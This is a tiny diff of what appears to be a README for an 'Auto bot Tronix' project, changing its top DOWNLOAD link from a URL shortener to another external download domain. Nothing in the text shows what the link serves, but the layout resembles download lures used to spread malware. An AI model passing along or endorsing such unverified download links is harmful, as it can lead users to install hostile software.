@@ -1,4 +1,4 @@
-[DOWNLOAD](https://goo.su/YXlm)
+[DOWNLOAD](https://gitdwnl.com/latest)
 ---
 
 <h1 align="center">Auto bot Tronix</h1>
